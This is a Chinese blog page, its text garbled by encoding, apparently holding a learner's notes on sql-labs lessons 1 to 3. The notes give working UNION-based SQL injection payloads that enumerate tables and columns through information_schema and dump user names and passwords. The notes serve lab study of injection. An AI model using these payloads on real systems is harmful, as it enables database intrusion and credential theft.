

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
  <link rel="icon" href="/img/logo.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="aidemofashi">
  <meta name="keywords" content="">
  
    <meta name="description" content="sql-labs å­¦ä¹ ç¬”è®°sql-labs less-1å­—ç¬¦å‹sqlæ³¨å…¥åç«¯ä»£ç (ç¼–çš„) 1select * from users where id&#x3D;&#x27;$get_id&#x27; åœ¨urlä¸­ç›´æ¥ä½¿ç”¨â€™#â€™ä¼šè¢«urlè§£æï¼Œå¯¼è‡´ä¼ å…¥æœåŠ¡å™¨çš„ä¸ä¸ºâ€™#â€™æ‰€ä»¥ä½¿ç”¨â€˜- - +â€™ 12?id&#x3D;1&#x27;&#x2F;&#x2F;çœ‹èƒ½å¦åˆ¤æ–­sqlæ³¨å…¥ç±»å‹ æ‹¼å…¥sqlæŸ¥è¯¢ 1select * from users whe">
<meta property="og:type" content="article">
<meta property="og:title" content="note-01">
<meta property="og:url" content="https://aidemofashi.github.io/2025/02/26/notepad/index.html">
<meta property="og:site_name" content="aidemofashi&#39;s blog">
<meta property="og:description" content="sql-labs å­¦ä¹ ç¬”è®°sql-labs less-1å­—ç¬¦å‹sqlæ³¨å…¥åç«¯ä»£ç (ç¼–çš„) 1select * from users where id&#x3D;&#x27;$get_id&#x27; åœ¨urlä¸­ç›´æ¥ä½¿ç”¨â€™#â€™ä¼šè¢«urlè§£æï¼Œå¯¼è‡´ä¼ å…¥æœåŠ¡å™¨çš„ä¸ä¸ºâ€™#â€™æ‰€ä»¥ä½¿ç”¨â€˜- - +â€™ 12?id&#x3D;1&#x27;&#x2F;&#x2F;çœ‹èƒ½å¦åˆ¤æ–­sqlæ³¨å…¥ç±»å‹ æ‹¼å…¥sqlæŸ¥è¯¢ 1select * from users whe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/2.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/3.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/4.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/5.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/6.png">
<meta property="article:published_time" content="2025-02-26T13:47:26.000Z">
<meta property="article:modified_time" content="2025-10-18T15:39:01.540Z">
<meta property="article:author" content="aidemofashi">
<meta property="article:tag" content="sql-labs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
  
  
  
  <title>note-01 - aidemofashi&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>aidemofashi&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>åˆ†ç±»</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>æ ‡ç­¾</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="note-01"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-26 21:47" pubdate>
          2025å¹´2æœˆ26æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          66k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          553 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">note-01</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="sql-labs-å­¦ä¹ ç¬”è®°"><a href="#sql-labs-å­¦ä¹ ç¬”è®°" class="headerlink" title="sql-labs å­¦ä¹ ç¬”è®°"></a>sql-labs å­¦ä¹ ç¬”è®°</h1><h2 id="sql-labs-less-1"><a href="#sql-labs-less-1" class="headerlink" title="sql-labs less-1"></a>sql-labs less-1</h2><p>å­—ç¬¦å‹<br>sqlæ³¨å…¥åç«¯ä»£ç (ç¼–çš„)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure>
<p><em><strong>åœ¨urlä¸­ç›´æ¥ä½¿ç”¨â€™#â€™ä¼šè¢«urlè§£æï¼Œå¯¼è‡´ä¼ å…¥æœåŠ¡å™¨çš„ä¸ä¸ºâ€™#â€™æ‰€ä»¥ä½¿ç”¨â€˜- - +â€™</strong></em></p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<br><span class="hljs-comment">//çœ‹èƒ½å¦åˆ¤æ–­sqlæ³¨å…¥ç±»å‹</span><br></code></pre></td></tr></table></figure>
<p>æ‹¼å…¥sqlæŸ¥è¯¢</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™1â€™â€™ LIMIT 0,1â€™ at line 1</p>
<p>KIMIï¼š  </p>
<blockquote>
<p>è¿™ä¸ªé”™è¯¯ä¿¡æ¯è¡¨æ˜ä½ çš„SQLè¯­å¥ä¸­å­˜åœ¨è¯­æ³•é—®é¢˜ï¼Œå…·ä½“é—®é¢˜å‡ºç°åœ¨â€™1â€™é™„è¿‘ï¼Œå¯èƒ½æ˜¯å› ä¸ºSQLè¯­å¥çš„æ‹¼æ¥æ–¹å¼ä¸æ­£ç¡®ï¼Œæˆ–è€…æŸäº›éƒ¨åˆ†çš„æ ¼å¼ä¸ç¬¦åˆMySQLçš„è¯­æ³•è§„åˆ™ã€‚<br>ä»é”™è¯¯ä¿¡æ¯æ¥çœ‹ï¼Œé—®é¢˜å¯èƒ½å‡ºåœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
</blockquote>
<blockquote>
<p>å•å¼•å·çš„ä½¿ç”¨ï¼šé”™è¯¯ä¿¡æ¯ä¸­æåˆ°â€™1â€™ï¼Œè¿™è¡¨æ˜SQLè¯­å¥ä¸­å¯èƒ½æœ‰å¤šä½™çš„å•å¼•å·ï¼Œæˆ–è€…å•å¼•å·çš„ä½¿ç”¨æ–¹å¼ä¸æ­£ç¡®ã€‚</p>
</blockquote>
<blockquote>
<p>LIMITå­å¥çš„æ ¼å¼ï¼šLIMIT 0,1æ˜¯æ­£ç¡®çš„è¯­æ³•ï¼Œä½†é”™è¯¯ä¿¡æ¯è¡¨æ˜å®ƒå¯èƒ½ä¸å‰é¢çš„è¯­å¥æ‹¼æ¥ä¸å½“ã€‚</p>
</blockquote>
<blockquote>
<p>æ³¨å…¥æ”»å‡»ï¼šå¦‚æœâ€™1â€™æ˜¯ç”¨æˆ·è¾“å…¥çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆè¿™å¯èƒ½æ˜¯SQLæ³¨å…¥æ”»å‡»çš„è¿¹è±¡ã€‚</p>
</blockquote>
<p><strong>LIMIT 0,1 æ˜¯ SQL è¯­å¥ä¸­ç”¨äºé™åˆ¶æŸ¥è¯¢ç»“æœæ•°é‡çš„å­å¥ï¼Œç‰¹åˆ«æ˜¯åœ¨ MySQL æ•°æ®åº“ä¸­ã€‚<br>å®ƒçš„ä½œç”¨æ˜¯ä»æŸ¥è¯¢ç»“æœä¸­æå–æŒ‡å®šèŒƒå›´çš„è®°å½•ã€‚å…·ä½“æ¥è¯´ï¼ŒLIMIT 0,1 çš„å«ä¹‰å¦‚ä¸‹ï¼š</strong>  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">è¯­æ³•æ ¼å¼ï¼š<br>LIMIT <span class="hljs-built_in">offset</span>, <span class="hljs-built_in">count</span><br><span class="hljs-built_in">offset</span>ï¼šè¡¨ç¤ºä»ç»“æœé›†çš„ç¬¬å‡ æ¡è®°å½•å¼€å§‹æå–ï¼ˆä» <span class="hljs-number">0</span> å¼€å§‹è®¡æ•°ï¼‰ã€‚<br><span class="hljs-built_in">count</span>ï¼šè¡¨ç¤ºæå–çš„è®°å½•æ•°é‡ã€‚<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾æœ‰æ•°å­—åˆ¤æ–­ä¸ºå­—ç¬¦å‹</p>
<p><em><strong>è®°å¾—ç”¨â€˜-1â€™æ¥ä½¿å¾—å‰é¢å¯¹â€˜-1â€™çš„æŸ¥è¯¢å‡ºç°nullçš„ç»“æœå…å¾—ä½¿ç”¨â€˜1â€™æŸ¥è¯¢å‡ºçš„ç»“æœä¼šå°†åé¢çš„æŸ¥è¯¢è¦†ç›–ï¼Œç”±åˆšæ‰çš„ï¼š</strong></em>  </p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-number">0</span>ï¼šè¡¨ç¤ºä»ç»“æœé›†çš„ç¬¬ä¸€æ¡è®°å½•å¼€å§‹ï¼ˆå³è·³è¿‡ <span class="hljs-number">0</span> æ¡è®°å½•ï¼‰ã€‚<br><span class="hljs-number">1</span>ï¼šè¡¨ç¤ºåªæå–ä¸€æ¡è®°å½•ã€‚<br>å› æ­¤ï¼Œ<span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> çš„ä½œç”¨æ˜¯ä»æŸ¥è¯¢ç»“æœä¸­æå–ç¬¬ä¸€æ¡è®°å½•ã€‚<br></code></pre></td></tr></table></figure>
<p>æµ‹è¯•å›æ˜¾è¡Œåˆ—</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;order</span> by <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><br>?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å½“å‰åº“</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>åé¢çš„paylaod</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(id,username,password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br></code></pre></td></tr></table></figure>

<p>åœ¨åšå®¢å›­å’Œcsdnæœ‰å¾ˆå¤šè¯¦ç»†è§£é‡Šï¼Œåªè®°ä¸‹è‡ªå·±ä¸æ˜ç™½å»æŸ¥è¯¢çš„ç‚¹ä»¥é˜²ä»¥åå¿˜è®°</p>
<h3 id="æˆ‘çš„æ–°çŸ¥è¯†ç‚¹"><a href="#æˆ‘çš„æ–°çŸ¥è¯†ç‚¹" class="headerlink" title="æˆ‘çš„æ–°çŸ¥è¯†ç‚¹"></a>æˆ‘çš„æ–°çŸ¥è¯†ç‚¹</h3><p><strong>group_concat &#x2F;&#x2F;å°†æŸ¥è¯¢åˆ°çš„è¡¨çš„æ•°æ®ç»“æœæ‹¼æ¥èµ·æ¥</strong></p>
<p><strong>union select &#x2F;&#x2F;è”åˆæŸ¥è¯¢ï¼Œèƒ½å°†åŒæ—¶æŸ¥è¯¢ 1,2,3 ä¸ª</strong></p>
<p><strong>information_schema &#x2F;&#x2F;åœ¨SQLä¸­ï¼ŒINFORMATION_SCHEMA æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œå®ƒå­˜å‚¨äº†æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰çš„å…ƒæ•°æ®ä¿¡æ¯ã€‚è¿™äº›å…ƒæ•°æ®åŒ…æ‹¬æ•°æ®åº“çš„ç»“æ„ã€è¡¨çš„ä¿¡æ¯ã€åˆ—çš„å®šä¹‰ã€ç”¨æˆ·æƒé™ã€å­˜å‚¨è¿‡ç¨‹ç­‰ã€‚</strong></p>
<p>INFORMATION_SCHEMA æä¾›äº†ä¸€ç§æ ‡å‡†åŒ–çš„æ–¹å¼æ¥è®¿é—®æ•°æ®åº“çš„å…ƒæ•°æ®ä¿¡æ¯ã€‚å®ƒç±»ä¼¼äºä¸€ä¸ªâ€œæ•°æ®åº“çš„æ•°æ®åº“â€ï¼Œå¸®åŠ©ç”¨æˆ·äº†è§£æ•°æ®åº“çš„å†…éƒ¨ç»“æ„å’Œé…ç½®ã€‚é€šè¿‡æŸ¥è¯¢ INFORMATION_SCHEMA ä¸­çš„è¡¨ï¼Œç”¨æˆ·å¯ä»¥è·å–ä»¥ä¸‹ä¿¡æ¯ï¼š  </p>
<p>æ•°æ®åº“ä¸­æœ‰å“ªäº›è¡¨ï¼ˆINFORMATION_SCHEMA.TABLESï¼‰ã€‚  </p>
<p>æ¯ä¸ªè¡¨æœ‰å“ªäº›åˆ—ï¼ˆINFORMATION_SCHEMA.COLUMNSï¼‰ã€‚</p>
<p>æ•°æ®åº“çš„ç”¨æˆ·æƒé™ï¼ˆINFORMATION_SCHEMA.USER_PRIVILEGESï¼‰ã€‚</p>
<p>æ•°æ®åº“çš„å­—ç¬¦é›†å’Œæ ¡å¯¹è§„åˆ™ï¼ˆINFORMATION_SCHEMA.CHARACTER_SETSï¼‰ã€‚</p>
<p>å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°çš„å®šä¹‰ï¼ˆINFORMATION_SCHEMA.ROUTINESï¼‰ã€‚</p>
<p>æ•°æ®åº“çš„è¡¨åˆ†åŒºä¿¡æ¯ï¼ˆINFORMATION_SCHEMA.PARTITIONSï¼‰ã€‚</p>
<p>æ•°æ®åº“çš„å¤–é”®çº¦æŸä¿¡æ¯ï¼ˆINFORMATION_SCHEMA.KEY_COLUMN_USAGEï¼‰ã€‚</p>
<p><em><strong>æˆ‘çœ‹æˆ‘ç›®å‰ç”¨åˆ°çš„æ˜¯ä¸‹é¢ï¼š</strong></em></p>
<p>  (1) INFORMATION_SCHEMA.TABLES<br>ç”¨é€”ï¼šåˆ—å‡ºæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„ä¿¡æ¯ã€‚<br>å­—æ®µï¼š<br>table_schemaï¼šè¡¨æ‰€å±çš„æ•°æ®åº“åç§°ã€‚<br>table_nameï¼šè¡¨çš„åç§°ã€‚<br>table_typeï¼šè¡¨çš„ç±»å‹ï¼ˆå¦‚ BASE TABLE æˆ– VIEWï¼‰ã€‚<br>engineï¼šè¡¨çš„å­˜å‚¨å¼•æ“ï¼ˆå¦‚ InnoDB æˆ– MyISAMï¼‰ã€‚</p>
<p>(2) INFORMATION_SCHEMA.COLUMNS<br>ç”¨é€”ï¼šåˆ—å‡ºè¡¨ä¸­æ‰€æœ‰åˆ—çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>å­—æ®µï¼š<br>table_schemaï¼šè¡¨æ‰€å±çš„æ•°æ®åº“åç§°ã€‚<br>table_nameï¼šè¡¨çš„åç§°ã€‚<br>column_nameï¼šåˆ—çš„åç§°ã€‚<br>data_typeï¼šåˆ—çš„æ•°æ®ç±»å‹<br>character_maximum_lengthï¼šåˆ—çš„æœ€å¤§é•¿åº¦ã€‚</p>
<p><em><strong>æ­é… where æ¥ä½¿ç”¨</strong></em></p>
<p>å›é¡¾åˆšæ‰çš„payload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">?id=-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><h3 id="æ–°çŸ¥è¯†ç‚¹"><a href="#æ–°çŸ¥è¯†ç‚¹" class="headerlink" title="æ–°çŸ¥è¯†ç‚¹"></a>æ–°çŸ¥è¯†ç‚¹</h3><p><em><strong>æ•°å­—å‹æ³¨å…¥çš„sqlè¯­å¥</strong></em></p>
<p>åç«¯ä»£ç  ä¾‹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;selcet * from users where id=<span class="hljs-variable">$get_id</span>&quot;</span><br><br></code></pre></td></tr></table></figure>
<p>ä¸å­—ç¬¦å‹çš„åŒºåˆ«æ˜¯å°†ç”¨æˆ·è¾“å…¥å†…å®¹ï¼š</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$get</span>_id</span><br></code></pre></td></tr></table></figure>
<p>ç›´æ¥æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ã€‚  </p>
<p>å¯¹æ¯”å­—ç¬¦å‹sqlè¯­å¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æ‰€ä»¥ä¸éœ€è¦ä½¿ç”¨ â€œ â€˜ â€œ æ¥æ„å»ºæ–°çš„æŸ¥è¯¢ï¼Œä¹Ÿä¸éœ€è¦ â€˜#â€™ æˆ–è€… â€˜â€“+â€™æ¥å°†åé¢çš„è¯­å¥æ³¨é‡Šæ‰ï¼Œå¦‚æœå¸¦å¯†ç åˆ™éœ€è¦æ³¨é‡Šå§  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()<br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br><br><br><span class="hljs-comment">---</span><br>title: note<span class="hljs-number">-02</span><br><span class="hljs-type">date</span>: <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-27</span> <span class="hljs-number">18</span>:<span class="hljs-number">26</span>:<span class="hljs-number">18</span><br>tags: <span class="hljs-keyword">sql</span>-labs<br><span class="hljs-comment">---</span><br># <span class="hljs-keyword">sql</span>-labs less<span class="hljs-number">-3</span>  <br><br>ä¼ å…¥ï¼š<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">å›æ˜¾<br>&gt;You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br><br>æ ¹æ®csdnå’Œé¢˜ç›®çš„æç¤ºï¼Œæ¨æµ‹sqlæŸ¥è¯¢è¯­å¥  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(â€˜$idâ€™)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">æ‰€ä»¥å½“ä¼ å…¥payloadä¸º<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™) â€“+</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">æ•´æ®µ<span class="hljs-keyword">sql</span>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<br></code></pre></td></tr></table></figure>
<p>select * from users where $id&#x3D;(â€˜1â€™)â€“+)</p>
